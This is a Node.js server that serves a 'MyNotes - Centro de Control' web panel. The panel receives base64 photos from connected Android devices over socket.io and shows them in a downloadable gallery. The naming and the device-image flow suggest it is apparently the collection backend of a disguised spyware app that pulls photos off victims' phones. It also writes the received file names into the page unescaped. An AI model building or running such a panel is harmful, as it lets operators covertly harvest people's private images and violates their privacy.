const express = require('express');
const http = require('http');
const { Server } = require("socket.io");
const cors = require('cors');

const app = express();
app.use(cors());

// --- DISEÑO MEJORADO DEL PANEL ---
app.get('/', (req, res) => {
    res.send(`
    <html>
        <head>
            <title>MyNotes - Centro de Control</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                /* Estilo oscuro moderno */
                body { 
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
                    background-color: #121212; 
                    color: #e0e0e0; 
                    margin: 0; 
                    padding: 20px; 
                }
                h1 { color: #bb86fc; text-align: center; margin-bottom: 10px; }
                
                /* Barra de estado */
                #status { 
                    text-align: center; 
                    padding: 12px; 
                    background: #1f1f1f; 
                    border-radius: 8px; 
                    margin-bottom: 25px;
                    border: 1px solid #333;
                    color: #03dac6;
                    font-weight: bold;
                }

                /* Rejilla de fotos (Gallery Grid) */
                .gallery { 
                    display: grid; 
                    grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); 
                    gap: 15px; 
                }

                /* Tarjeta de cada foto */
                .card { 
                    background: #1e1e1e; 
                    border-radius: 10px; 
                    overflow: hidden; 
                    box-shadow: 0 4px 6px rgba(0,0,0,0.3); 
                    transition: transform 0.2s;
                    display: flex;
                    flex-direction: column;
                }
                .card:hover { transform: translateY(-5px); border: 1px solid #bb86fc; }

                /* Imagen */
                img { 
                    width: 100%; 
                    height: 150px; 
                    object-fit: cover; 
                    cursor: pointer;
                }

                /* Información y Botón */
                .info { padding: 10px; display: flex; flex-direction: column; gap: 8px; }
                .name { font-size: 12px; color: #aaa; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
                
                /* BOTÓN DE DESCARGA */
                .btn-download {
                    background-color: #3700b3;
                    color: white;
                    text-decoration: none;
                    padding: 8px;
                    border-radius: 5px;
                    text-align: center;
                    font-size: 12px;
                    font-weight: bold;
                    transition: background 0.3s;
                }
                .btn-download:hover { background-color: #6200ee; }
            </style>
        </head>
        <body>
            <h1>📁 Galería MyNotes</h1>
            <div id="status">⏳ Esperando conexión del dispositivo...</div>
            <div class="gallery" id="photoGrid"></div>

            <script src="/socket.io/socket.io.js"></script>
            <script>
                const socket = io();
                const grid = document.getElementById('photoGrid');
                const status = document.getElementById('status');

                // Aviso de conexión
                socket.on('connection_alert', (msg) => {
                    status.innerHTML = "🟢 " + msg;
                    status.style.borderColor = '#03dac6';
                });

                // Al recibir una foto nueva
                socket.on('new_photo', (data) => {
                    // Evitar duplicados (si la red falla y reenvía)
                    if(document.getElementById(data.path)) return;

                    const card = document.createElement('div');
                    card.className = 'card';
                    card.id = data.path; // ID único para evitar repetidas
                    
                    // Convertir base64 a formato utilizable
                    const imgSource = \`data:image/jpeg;base64,\${data.image64}\`;
                    
                    card.innerHTML = \`
                        <img src="\${imgSource}" onclick="window.open('\${imgSource}')" title="Ver grande">
                        <div class="info">
                            <div class="name">\${data.name}</div>
                            <a href="\${imgSource}" download="\${data.name}" class="btn-download">⬇ Descargar</a>
                        </div>
                    \`;
                    
                    // 'prepend' pone las fotos nuevas PRIMERO (arriba)
                    grid.prepend(card); 
                });
            </script>
        </body>
    </html>
    `);
});

const server = http.createServer(app);

// CONFIGURACIÓN DE ESTABILIDAD
const io = new Server(server, {
    cors: { origin: "*" },
    allowEIO3: true,         // Vital para compatibilidad con Android
    maxHttpBufferSize: 1e8,  // AUMENTADO A 100MB: Evita que se "corte" la conexión con fotos grandes
    pingTimeout: 60000       // Esperar más tiempo antes de desconectar por mala red
});

io.on('connection', (socket) => {
    console.log('🔗 Cliente conectado:', socket.id);
    io.emit('connection_alert', `Dispositivo conectado (ID: ${socket.id.substring(0,5)})`);

    socket.on('usrData', (data) => {
        // Solo procesamos si es una imagen válida
        if (data.dataType === 'images_list' && data.image64) {
            io.emit('new_photo', data);
        }
    });

    socket.on('disconnect', () => {
        console.log('❌ Cliente desconectado');
        io.emit('connection_alert', '🔴 Dispositivo desconectado (Esperando...)');
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 Servidor Premium corriendo en puerto ${PORT}`);
});
